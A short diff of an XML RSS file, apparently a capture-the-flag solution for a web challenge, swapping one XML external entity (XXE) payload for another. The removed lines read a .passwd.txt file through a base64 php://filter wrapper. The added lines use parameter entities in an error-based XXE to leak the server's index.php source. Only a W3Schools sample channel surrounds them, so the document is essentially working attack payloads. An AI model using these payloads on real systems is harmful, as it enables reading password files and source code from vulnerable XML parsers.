@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE rss [<!ENTITY payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///challenge/web-serveur/ch29/.passwd.txt"> ]> 
-<rss version="2.0">
+<!ENTITY % file SYSTEM "file:///challenge/web-serveur/ch29/index.php">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
 <channel>
   <title>W3Schools Home Page </title>
   <link>https://www.w3schools.com</link>
